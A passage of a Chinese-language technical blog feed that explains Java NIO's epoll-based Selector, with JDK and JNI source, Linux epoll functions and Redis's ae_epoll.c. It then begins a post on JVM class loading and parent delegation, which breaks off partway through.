 <span class="keyword">return</span> numKeysUpdated;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>EPollArrayWrapper的<code>poll</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">poll</span><span class="params">(<span class="type">long</span> timeout)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 调用updateRegistrations方法</span></span><br><span class="line">    updateRegistrations();</span><br><span class="line">    <span class="comment">// 然后调用epollWait方法(native)从epoll中等待事件发生</span></span><br><span class="line">    updated = epollWait(pollArrayAddress, NUM_EPOLLEVENTS, timeout, epfd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;updated; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (getDescriptor(i) == incomingInterruptFD) &#123;</span><br><span class="line">            interruptedIndex = i;</span><br><span class="line">            interrupted = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> updated;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateRegistrations</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (updateLock) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 遍历所有注册的SocketChannel</span></span><br><span class="line">        <span class="keyword">while</span> (j &lt; updateCount) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">fd</span> <span class="operator">=</span> updateDescriptors[j];</span><br><span class="line">            <span class="type">short</span> <span class="variable">events</span> <span class="operator">=</span> getUpdateEvents(fd);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isRegistered</span> <span class="operator">=</span> registered.get(fd);</span><br><span class="line">            <span class="type">int</span> <span class="variable">opcode</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (events != KILLED) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isRegistered) &#123;</span><br><span class="line">                    opcode = (events != <span class="number">0</span>) ? EPOLL_CTL_MOD : EPOLL_CTL_DEL;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    opcode = (events != <span class="number">0</span>) ? EPOLL_CTL_ADD : <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (opcode != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// 调用epollCtl方法(native)真正注册SocketChannel</span></span><br><span class="line">                    epollCtl(epfd, opcode, fd, events);</span><br><span class="line">                    <span class="keyword">if</span> (opcode == EPOLL_CTL_ADD) &#123;</span><br><span class="line">                        registered.set(fd);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == EPOLL_CTL_DEL) &#123;</span><br><span class="line">                        registered.clear(fd);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        updateCount = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">epollCtl</span><span class="params">(<span class="type">int</span> epfd, <span class="type">int</span> opcode, <span class="type">int</span> fd, <span class="type">int</span> events)</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">epollWait</span><span class="params">(<span class="type">long</span> pollAddress, <span class="type">int</span> numfds, <span class="type">long</span> timeout,<span class="type">int</span> epfd)</span> <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure>

<p>最终调用了两个native方法，找到它们的c语言实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// epollCtl方法</span></span><br><span class="line">JNIEXPORT <span class="type">void</span> JNICALL</span><br><span class="line"><span class="title function_">Java_sun_nio_ch_EPollArrayWrapper_epollCtl</span><span class="params">(JNIEnv *env, jobject this, jint epfd,</span></span><br><span class="line"><span class="params">                                           jint opcode, jint fd, jint events)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span></span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line"></span><br><span class="line">    event.events = events;</span><br><span class="line">    event.data.fd = fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用linux系统函数epoll_ctl，把SocketChannel和epoll关联，真正实现注册</span></span><br><span class="line">    <span class="comment">// epfd为epoll的文件描述符、opcode为操作符、fd为SocketChannel的文件描述符、event为事件</span></span><br><span class="line">    RESTARTABLE(epoll_ctl(epfd, (<span class="type">int</span>)opcode, (<span class="type">int</span>)fd, &amp;event), res);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * A channel may be registered with several Selectors. When each Selector</span></span><br><span class="line"><span class="comment">     * is polled a EPOLL_CTL_DEL op will be inserted into its pending update</span></span><br><span class="line"><span class="comment">     * list to remove the file descriptor from epoll. The &quot;last&quot; Selector will</span></span><br><span class="line"><span class="comment">     * close the file descriptor which automatically unregisters it from each</span></span><br><span class="line"><span class="comment">     * epoll descriptor. To avoid costly synchronization between Selectors we</span></span><br><span class="line"><span class="comment">     * allow pending updates to be processed, ignoring errors. The errors are</span></span><br><span class="line"><span class="comment">     * harmless as the last update for the file descriptor is guaranteed to</span></span><br><span class="line"><span class="comment">     * be EPOLL_CTL_DEL.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (res &lt; <span class="number">0</span> &amp;&amp; errno != EBADF &amp;&amp; errno != ENOENT &amp;&amp; errno != EPERM) &#123;</span><br><span class="line">        JNU_ThrowIOExceptionWithLastError(env, <span class="string">&quot;epoll_ctl failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// epollWait方法</span></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_sun_nio_ch_EPollArrayWrapper_epollWait</span><span class="params">(JNIEnv *env, jobject this,</span></span><br><span class="line"><span class="params">                                            jlong address, jint numfds,</span></span><br><span class="line"><span class="params">                                            jlong timeout, jint epfd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> *<span class="title">events</span> =</span> jlong_to_ptr(address);</span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timeout &lt;= <span class="number">0</span>) &#123;           <span class="comment">/* Indefinite or no wait */</span></span><br><span class="line">        <span class="comment">// 调用linux系统函数epoll_wait</span></span><br><span class="line">        <span class="comment">// 获取epoll的rdlist中的事件，没有就阻塞等待</span></span><br><span class="line">        RESTARTABLE(epoll_wait(epfd, events, numfds, timeout), res);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                      <span class="comment">/* Bounded wait; bounded restarts */</span></span><br><span class="line">        res = iepoll(epfd, events, numfds, timeout);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        JNU_ThrowIOExceptionWithLastError(env, <span class="string">&quot;epoll_wait failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里又有两个linux系统函数：</p>
<h4 id="epoll-ctl函数"><a href="#epoll-ctl函数" class="headerlink" title="epoll_ctl函数"></a>epoll_ctl函数</h4><p>事件注册函数，使用文件描述符epfd引用的epoll实例，对目标文件描述符fd执行op操作，成功返回0，失败返回-1：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">epoll_ctl</span><span class="params">(<span class="type">int</span> epfd, <span class="type">int</span> op, <span class="type">int</span> fd, <span class="keyword">struct</span> epoll_event *event)</span></span><br></pre></td></tr></table></figure>

<p>其中参数说明如下：</p>
<ul>
<li>epfd：就是第一个epoll函数<code>epoll_create</code>返回的句柄</li>
<li>fd：表示socket对应的文件描述符</li>
<li>op：op是表示做什么动作，有以下几个值<ul>
<li>EPOLL_CTL_ADD：注册新的fd到epfd中，并关联事件event</li>
<li>EPOLL_CTL_MOD：修改已经注册的fd的监听事件</li>
<li>EPOLL_CTL_DEL：从epfd中移除fd，并且忽略掉绑定的event，这时event可以为null</li>
</ul>
</li>
<li>event：表示epoll内核要监听什么事件，常用的有如下几种<ul>
<li>EPOLLIN ：表示对应的文件描述符可以读（包括对端SOCKET正常关闭）</li>
<li>EPOLLOUT：表示对应的文件描述符可以写</li>
<li>EPOLLPRI：表示对应的文件描述符有紧急的数据可读</li>
<li>EPOLLERR：表示对应的文件描述符发生错误</li>
<li>EPOLLHUP：表示对应的文件描述符被挂断</li>
</ul>
</li>
</ul>
<p>其中参数event是一个结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> &#123;</span></span><br><span class="line">   <span class="type">__uint32_t</span>   events;      <span class="comment">/* Epoll events */</span></span><br><span class="line">   <span class="type">epoll_data_t</span> data;        <span class="comment">/* User data variable */</span></span><br><span class="line">&#125;;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">epoll_data</span> &#123;</span></span><br><span class="line">   <span class="type">void</span>        *ptr;</span><br><span class="line">   <span class="type">int</span>          fd;</span><br><span class="line">   <span class="type">__uint32_t</span>   u32;</span><br><span class="line">   <span class="type">__uint64_t</span>   u64;</span><br><span class="line">&#125; <span class="type">epoll_data_t</span>;</span><br></pre></td></tr></table></figure>

<h4 id="epoll-wait函数"><a href="#epoll-wait函数" class="headerlink" title="epoll_wait函数"></a>epoll_wait函数</h4><p>用于等待事件的发生，返回值表示需要处理的事件数目：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">epoll_wait</span><span class="params">(<span class="type">int</span> epfd, <span class="keyword">struct</span> epoll_event *events, <span class="type">int</span> maxevents, <span class="type">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure>

<p>参数如下：</p>
<ul>
<li>epfd：等待文件描述符epfd上的事件，即等待epoll中的事件</li>
<li>events：存储<code>epoll_wait</code>操作完成后所有发生的事件</li>
<li>maxevents：表示当前要监听的所有socket句柄数，即最多等待多少个事件就返回</li>
<li>time_out：超时时间</li>
</ul>
<h2 id="Epoll的原理"><a href="#Epoll的原理" class="headerlink" title="Epoll的原理"></a>Epoll的原理</h2><p>Selector的源码并不复杂，主要围绕Linux中的epoll展开，主要调用了如下几个Linux系统函数：</p>
<ul>
<li><code>epoll_create</code>：创建epoll对象</li>
<li><code>epoll_ctl</code>：注册socket到epoll对象上</li>
<li><code>epoll_wait</code>：从epoll上获取事件</li>
</ul>
<p>那么事件是如何添加到epoll上的？</p>
<p>当机器的网卡接收到网络通信数据的时候，会产生一个<strong>硬件中断</strong>，中断服务子程序中就会将事件添加到epoll的<strong>就绪队列（rdlist）</strong>中，<code>epoll_wait</code>函数就是从epoll的就绪队列中获得对应的事件。</p>
<p>这样就省去了遍历所有socket的过程，可以直接拿到所有事件，并且事件添加的过程是操作系统内核帮我们实现的，无须应用程序关心。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/02/24/fjDu5tslhVvRPyi.png"
                      alt="nio3.jpg"
                ></p>
<h1 id="Redis中的epoll"><a href="#Redis中的epoll" class="headerlink" title="Redis中的epoll"></a>Redis中的epoll</h1><p>之前在介绍Redis的时候，我们说Redis中用于处理客户端请求是单线程的，那它是如何有那么高的并发量的？其实Redis中也用到了epoll模型，在<code>ae_epoll.c</code>中就可以看到相关源码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">aeApiState</span> &#123;</span><br><span class="line">    <span class="type">int</span> epfd;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">epoll_event</span> *events;</span><br><span class="line">&#125; aeApiState;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">aeApiCreate</span><span class="params">(aeEventLoop *eventLoop)</span> </span>&#123;</span><br><span class="line">    aeApiState *state = <span class="built_in">zmalloc</span>(<span class="built_in">sizeof</span>(aeApiState));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!state) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    state-&gt;events = <span class="built_in">zmalloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> epoll_event)*eventLoop-&gt;setsize);</span><br><span class="line">    <span class="keyword">if</span> (!state-&gt;events) &#123;</span><br><span class="line">        <span class="built_in">zfree</span>(state);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// epoll_create函数创建epoll</span></span><br><span class="line">    state-&gt;epfd = <span class="built_in">epoll_create</span>(<span class="number">1024</span>); <span class="comment">/* 1024 is just a hint for the kernel */</span></span><br><span class="line">    <span class="keyword">if</span> (state-&gt;epfd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">zfree</span>(state-&gt;events);</span><br><span class="line">        <span class="built_in">zfree</span>(state);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    eventLoop-&gt;apidata = state;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">aeApiResize</span><span class="params">(aeEventLoop *eventLoop, <span class="type">int</span> setsize)</span> </span>&#123;</span><br><span class="line">    aeApiState *state = eventLoop-&gt;apidata;</span><br><span class="line"></span><br><span class="line">    state-&gt;events = <span class="built_in">zrealloc</span>(state-&gt;events, <span class="built_in">sizeof</span>(<span class="keyword">struct</span> epoll_event)*setsize);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">aeApiFree</span><span class="params">(aeEventLoop *eventLoop)</span> </span>&#123;</span><br><span class="line">    aeApiState *state = eventLoop-&gt;apidata;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(state-&gt;epfd);</span><br><span class="line">    <span class="built_in">zfree</span>(state-&gt;events);</span><br><span class="line">    <span class="built_in">zfree</span>(state);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加事件</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">aeApiAddEvent</span><span class="params">(aeEventLoop *eventLoop, <span class="type">int</span> fd, <span class="type">int</span> mask)</span> </span>&#123;</span><br><span class="line">    aeApiState *state = eventLoop-&gt;apidata;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">epoll_event</span> ee = &#123;<span class="number">0</span>&#125;; <span class="comment">/* avoid valgrind warning */</span></span><br><span class="line">    <span class="comment">/* If the fd was already monitored for some event, we need a MOD</span></span><br><span class="line"><span class="comment">     * operation. Otherwise we need an ADD operation. */</span></span><br><span class="line">    <span class="type">int</span> op = eventLoop-&gt;events[fd].mask == AE_NONE ?</span><br><span class="line">            EPOLL_CTL_ADD : EPOLL_CTL_MOD;</span><br><span class="line"></span><br><span class="line">    ee.events = <span class="number">0</span>;</span><br><span class="line">    mask |= eventLoop-&gt;events[fd].mask; <span class="comment">/* Merge old events */</span></span><br><span class="line">    <span class="keyword">if</span> (mask &amp; AE_READABLE) ee.events |= EPOLLIN;</span><br><span class="line">    <span class="keyword">if</span> (mask &amp; AE_WRITABLE) ee.events |= EPOLLOUT;</span><br><span class="line">    ee.data.fd = fd;</span><br><span class="line">    <span class="comment">// epoll_ctl函数添加事件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">epoll_ctl</span>(state-&gt;epfd,op,fd,&amp;ee) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除事件</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">aeApiDelEvent</span><span class="params">(aeEventLoop *eventLoop, <span class="type">int</span> fd, <span class="type">int</span> delmask)</span> </span>&#123;</span><br><span class="line">    aeApiState *state = eventLoop-&gt;apidata;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">epoll_event</span> ee = &#123;<span class="number">0</span>&#125;; <span class="comment">/* avoid valgrind warning */</span></span><br><span class="line">    <span class="type">int</span> mask = eventLoop-&gt;events[fd].mask &amp; (~delmask);</span><br><span class="line"></span><br><span class="line">    ee.events = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (mask &amp; AE_READABLE) ee.events |= EPOLLIN;</span><br><span class="line">    <span class="keyword">if</span> (mask &amp; AE_WRITABLE) ee.events |= EPOLLOUT;</span><br><span class="line">    ee.data.fd = fd;</span><br><span class="line">    <span class="keyword">if</span> (mask != AE_NONE) &#123;</span><br><span class="line">        <span class="comment">// epoll_ctl函数删除事件</span></span><br><span class="line">        <span class="built_in">epoll_ctl</span>(state-&gt;epfd,EPOLL_CTL_MOD,fd,&amp;ee);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* Note, Kernel &lt; 2.6.9 requires a non null event pointer even for</span></span><br><span class="line"><span class="comment">         * EPOLL_CTL_DEL. */</span></span><br><span class="line">        <span class="built_in">epoll_ctl</span>(state-&gt;epfd,EPOLL_CTL_DEL,fd,&amp;ee);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取事件</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">aeApiPoll</span><span class="params">(aeEventLoop *eventLoop, <span class="keyword">struct</span> timeval *tvp)</span> </span>&#123;</span><br><span class="line">    aeApiState *state = eventLoop-&gt;apidata;</span><br><span class="line">    <span class="type">int</span> retval, numevents = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// epoll_wait函数获取事件</span></span><br><span class="line">    retval = <span class="built_in">epoll_wait</span>(state-&gt;epfd,state-&gt;events,eventLoop-&gt;setsize,</span><br><span class="line">            tvp ? (tvp-&gt;tv_sec*<span class="number">1000</span> + tvp-&gt;tv_usec/<span class="number">1000</span>) : <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (retval &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">        numevents = retval;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; numevents; j++) &#123;</span><br><span class="line">            <span class="type">int</span> mask = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">struct</span> <span class="title class_">epoll_event</span> *e = state-&gt;events+j;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (e-&gt;events &amp; EPOLLIN) mask |= AE_READABLE;</span><br><span class="line">            <span class="keyword">if</span> (e-&gt;events &amp; EPOLLOUT) mask |= AE_WRITABLE;</span><br><span class="line">            <span class="keyword">if</span> (e-&gt;events &amp; EPOLLERR) mask |= AE_WRITABLE;</span><br><span class="line">            <span class="keyword">if</span> (e-&gt;events &amp; EPOLLHUP) mask |= AE_WRITABLE;</span><br><span class="line">            eventLoop-&gt;fired[j].fd = e-&gt;data.fd;</span><br><span class="line">            eventLoop-&gt;fired[j].mask = mask;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> numevents;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">char</span> *<span class="title">aeApiName</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;epoll&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM性能调优</title>
    <url>/2021/04/10/2021/JVM%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h1><p>Java底层代码执行是需要类加载器</p>
<p>当我们用java命令运行某个类的main函数启动程序时，首先需要通过<strong>类加载器</strong>把主类加载到JVM。</p>
<p><strong>通过Java命令执行代码的大体流程如下：</strong></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/10/L5Y8S13nbM9swEC.jpg"
                      alt="Screenshot_30.jpg"
                ></p>
<p>其中引导类加载器获得其他的类加载器。再使用其他的类加载器来加载类。</p>
<p>也就是其中的<code>loadClass(&quot;xxxx&quot;)</code>。类加载过程有如下几步： </p>
<p>**加载 &gt;&gt; 验证 &gt;&gt; 准备 &gt;&gt; 解析 &gt;&gt; 初始化 &gt;&gt;使用 &gt;&gt; 卸载 **</p>
<p>加载：在硬盘上查找并通过IO读入字节码文件，使用到类时才会加载，例如调用类的main()方法，new对象等等，在加载阶段会在内存中生成一个<strong>代表这个类的java.lang.Class对象</strong>，作为方法区这个类的各种数据的访问入口</p>
<p>验证：校验字节码文件的正确性 【cafe babe开头</p>
<p>准备：给类的<em><strong>静态变量</strong></em> 、<em><strong>常量</strong></em>分配内存，并赋予默认值 </p>
<p>解析：将<strong>符号引用</strong>替换为直接引用，该阶段会把一些静态方法(符号引用，比如main()方法)替换为指向数据所存内存的指针或句柄等(直接引用)，这是所谓的<strong>静态链接</strong>过程(类加载期间完成)，<strong>动态链接</strong>是在程序运行期间完成的将符号引用替换为直接引用。 </p>
<p><strong>初始化</strong>：对类的静态变量初始化为指定的值，执行静态代码块</p>
<hr>
<p>类被加载到方法区中后主要包含 <strong>运行时常量池、类型信息、字段信息、方法信息、类加载器的引用、对应class实例的引用</strong>等信息。 </p>
<p><strong>类加载器的引用</strong>：这个类到类加载器实例的引用 </p>
<p><strong>对应class实例的引用</strong>：类加载器在加载类信息放到方法区中后，会创建一个对应的Class 类型的对象实例放到堆(Heap)中, 作为开发人员访问方法区中类定义的入口和切入点。 </p>
<p><strong>注意，</strong>主类在运行过程中如果使用到其它类，会逐步加载这些类。 </p>
<p>jar包或war包里的类不是一次性全部加载的，是使用到时才加载。</p>
<h1 id="类加载器和双亲委派机制"><a href="#类加载器和双亲委派机制" class="headerlink" title="类加载器和双亲委派机制"></a>类加载器和双亲委派机制</h1><p>上面的类加载过程主要是通过类加载器来实现的，Java里有如下几种类加载器 </p>
<ul>
<li><p>引导类加载器：负责加载支撑JVM运行的位于JRE的lib目录下的<strong>核心</strong>类库，比如 rt.jar、charsets.jar等 </p>
</li>
<li><p>扩展类加载器：负责加载支撑JVM运行的位于JRE的lib目录下的ext扩展目录中的JAR类包</p>
</li>
<li><p>应用程序类加载器：负责加载ClassPath路径下的类包，主要就是加载你自己写的那些类</p>
</li>
<li><p>自定义加载器：负责加载用户自定义路径下的类包</p>
</li>
</ul>
<p>大部分核心类都是由引导类加载器加载的！</p>
<p>双亲委派机制，并不是说<code>ApplicationClassLoad</code>的父类是扩展类加载器</p>
<p>而是<code>ApplicationClassLoad</code>的<code>Parent</code>的属性是扩展类加载器！！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/10/cZaiApRYTSLo6DI.jpg"
                      alt="Screenshot_32.jpg"
                ></p>
<p>具体流程</p>
<p>先是应用程序类加载器查看该类是否被加载了。如果被加载了就直接返回，否则会开始加载类的流程</p>
<p>加载类的时候先是委托<code>parent</code>来加载——是依靠native（c++）代码</p>
<p>此时到达扩展类加载器了，他是没有<code>parent</code>，一般是通过<code>findBootstrapClassOrNull</code>来加载引导类加载器。同样是native c++方法</p>
<p>现在就到达引导类加载器了，接下来往下走。</p>
<p>由于夫属性没有加载到类，所以返回空，所以本类看是否可以加载到类，加载不到，返回空</p>
<p>依次这样。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ClassLoader的loadClass方法 </span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">            <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">            Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">            <span class="comment">//已经加载的类中找不到</span></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">//如果有父亲就调用父亲来加载</span></span><br><span class="line">                        c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">//如果没有父亲就依靠引导类加载器加载</span></span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                <span class="comment">//这里就是依靠自己来加载了。【自定义加载器就是在这里处理的</span></span><br><span class="line">                c = findClass(name);</span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="为什么要设计双亲委派机制？"><a href="#为什么要设计双亲委派机制？" class="headerlink" title="为什么要设计双亲委派机制？"></a><strong>为什么要设计双亲委派机制？</strong></h2><p><strong>沙箱安全机制</strong>：</p>
<p>自己写的<strong>java.lang.String.class</strong>类不会被加载，这样便可以防止核心API库被随意篡改 </p>
<p>【注意到包名和实际的String的包名是一致的</p>
<p><strong>避免类的重复加载</strong>：</p>
<p>当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次，保证<strong>被加载类的唯一性</strong> </p>
<p>父亲加载了，就不需要子加载器再加载【比如 委托给父亲，加载成功就会直接返回。而不会使得子加载器再加载</p>
<p>【每个类加载器可能有相似的类，但是只会加载一份</p>
<p><strong>全盘负责委托机制</strong> </p>
<p>“<strong>全盘负责</strong>”是指当一个ClassLoder装载一个类时，除非显示的使用另外一个ClassLoder，该类所依赖及引用的类也由这个ClassLoder载入。</p>
<p>也就是说，当我们进行加载某个A类的时候，使用的App加载器，而A类中有静态的B类变量，则需要加载B类。这个时候一样由刚刚的App加载器来加载。</p>
<p><strong>自定义类加载器：</strong> </p>
<p>自定义类加载器只需要继承 java.lang.ClassLoader 类，该类有两个核心方法，一个是<code>loadClass(String, boolean)</code>，实现了<strong>双亲委派机制</strong>，还有一个方法是<code>findClass</code>，默认实现是空方法，所以我们自定义类加载器主要是<strong>重写</strong>findClass<strong>方法</strong>。 </p>
<p>根据上面的源码可以很清晰的看到为什么是修改<code>findClass</code>方法。</p>
<h2 id="打破双亲委派机制"><a href="#打破双亲委派机制" class="headerlink" title="打破双亲委派机制"></a>打破双亲委派机制</h2><p>其实很简单，只要我们修改加载器的源码【或者自定义加载器就可以</p>
<p>也就是在自定义类加载器的基础上，重写<code>loadClass</code>方法</p>
